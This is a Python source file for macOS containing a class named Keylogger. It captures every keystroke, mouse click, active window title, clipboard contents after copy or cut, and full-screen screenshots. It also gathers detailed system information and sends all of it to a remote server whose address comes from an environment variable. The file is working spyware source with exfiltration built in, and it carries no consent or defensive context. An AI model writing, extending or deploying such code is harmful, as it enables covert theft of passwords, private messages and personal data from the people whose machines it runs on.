import Quartz
import time
import datetime
import platform
import os
import requests
import json
import io
import base64
from Quartz import CGWindowListCopyWindowInfo, kCGNullWindowID, kCGWindowListOptionOnScreenOnly
from pynput.keyboard import Listener as KeyListener
from pynput.mouse import Listener as MouseListener
from PIL import ImageGrab
from pandas.io.clipboard import clipboard_get
from pynput import mouse
from dotenv import load_dotenv
load_dotenv()


class Keylogger:
    log_dir = r"./data/"
    stringKey = ""
    lastKey = ""
    os_data = {}

    def __init__(self):
        self.os_data["osName"] = platform.uname().system
        self.os_data["osInfo"] = self.get_os_info()
        self.os_data["appName"] = self.get_app_name()
        self.appName = self.get_active_window()
        self.elapsed_time = datetime.datetime.now()
        self.send_data('/init')

    def get_os_info(self):
        return platform.platform(), platform.uname(), platform.system(), platform.release(), platform.version(), platform.machine(), platform.processor(), platform.architecture(), platform.node(), platform.platform(), platform.python_build(), platform.python_compiler(), platform.python_branch(), platform.python_implementation(), platform.python_revision(), platform.python_version(), platform.python_version_tuple()

    def get_app_name(self):
        return self.get_active_window().split()[0]

    def get_active_window(self):
        windows = Quartz.CGWindowListCopyWindowInfo(
            Quartz.kCGWindowListExcludeDesktopElements | Quartz.kCGWindowListOptionOnScreenOnly, Quartz.kCGNullWindowID)
        for win in windows:
            if win['kCGWindowLayer'] == 0:
                return '%s %s' % (win[Quartz.kCGWindowOwnerName], win.get(Quartz.kCGWindowName, ''))

    def get_date_time(self):
        now = datetime.datetime.now()
        return now.strftime("%Y-%m-%d %H:%M:%S:%f")
    
    def capture_screen(self):
        try:
            # Take screenshot
            snapshot = ImageGrab.grab()
            snapshot = snapshot.convert("RGBA")

            # Create memory buffer
            buffer = io.BytesIO()

            # Save the screenshot to the buffer
            snapshot.save(buffer, format='PNG')

            # Get the buffer value as bytes
            image_bytes = buffer.getvalue()

            # Encode the image as base64
            encoded_string = base64.b64encode(image_bytes).decode('utf-8')

            # Send data
            self.send_data('/screenshots', {
                "time": self.get_date_time(),
                "appName": self.get_app_name(),
                "key": self.get_date_time() + self.get_app_name() + ".png",
                "type": "screenshot",
                "screenshot": encoded_string
            })
        except Exception as e:
            print("Error occurred while capturing screenshot: ", e)

    def get_clipboard(self):
        data = clipboard_get()
        return data

    def writeLog(self, dir, time, appName, key, type="key"):
        # check dir exist
        if not os.path.exists(dir):
            os.makedirs(dir)
        # write log
        with open(dir + "keyLog.txt", "a", encoding="utf-8") as f:
            if (type == "key"):
            # Check clipboard change
              if (self.lastKey == "Key.cmd" and (key == "'c'" or key == "'x'")):
                  # self.writeLog(self.log_dir, self.get_date_time(), self.get_active_window(), "Clipboard: " + self.get_clipboard())
                  self.send_data('/send', {
                      "time": self.get_date_time(),
                      "appName": self.get_active_window(),
                      "key": "Clipboard: " + self.get_clipboard(),
                      "type": "clipboard"
                  })
              elif (key != "Key.cmd"):
                  if (key == "'c'" or key == "'x'"):
                      self.stringKey += key
                  elif (key != "Key.enter"):
                      replace_values = ["'", "Key.space", "Key.shift", "Key.ctrl", "Key.alt", "Key.cmd", " "]
                      replace_with = ["", " ", "", "", "", "", ""]

                      for i in range(len(replace_values)):
                          key = key.replace(replace_values[i], replace_with[i])

                      self.stringKey += key
                  elif (key == "Key.enter" or (datetime.datetime.now() - self.elapsed_time).total_seconds() > 30):
                      # self.stringKey = ' '.join(self.stringKey)
                      f.write("==> " + time + ": " + appName + " - " + self.stringKey + "\n")
                      self.send_data('/send', {
                          "time": time,
                          "appName": appName,
                          "key": self.stringKey + "\n",
                          "type": "string"
                      })
                      self.stringKey = ""
                      self.elapsed_time = datetime.datetime.now()
              self.lastKey = key

            f.write(time + ": " + appName + " - " + key + "\n")
            self.send_data('/send', {
                "time": time,
                "appName": appName,
                "key": key + "\n",
                "type": type
            })
            f.close()

    def on_press(self, key):
        print(f"{key} pressed on app {self.get_active_window()}")
        if (self.get_active_window() != self.appName or str(key) == "Key.enter"):
            self.capture_screen()
            self.appName = self.get_active_window()

        self.writeLog(self.log_dir, self.get_date_time(),
                      self.get_active_window(), str(key))
        self.lastKey = str(key)

    def on_click(self, x, y, button, pressed):
        click = "Left Click"
        if pressed and button == mouse.Button.right:
            print("Right Click Detected (released)")
            click = "Right Click"
            self.capture_screen()

        print('{0} at {1} on app {2}'.format(
            'Pressed' if pressed else 'Released', (x, y), self.get_active_window()))
        self.writeLog(
            self.log_dir, 
            self.get_date_time(), 
            self.get_active_window(), 
            '{0} - {1} at {2}'.format('Pressed' if pressed else 'Released', click, (x, y)), 
            "mouse"
        )

    def send_data(self, url, data_value=None):
        host = os.environ.get('host')
        url = str(host) + str(url)
        headers = {"os_data": json.dumps(self.os_data)}

        if data_value is not None:
            response = requests.post(url, json=data_value, headers=headers)
            return response

        response = requests.get(url, headers=headers)
        return response

    def run(self):
        with MouseListener(on_click=self.on_click) as listener:
            with KeyListener(on_press=self.on_press) as listener:
                listener.join()
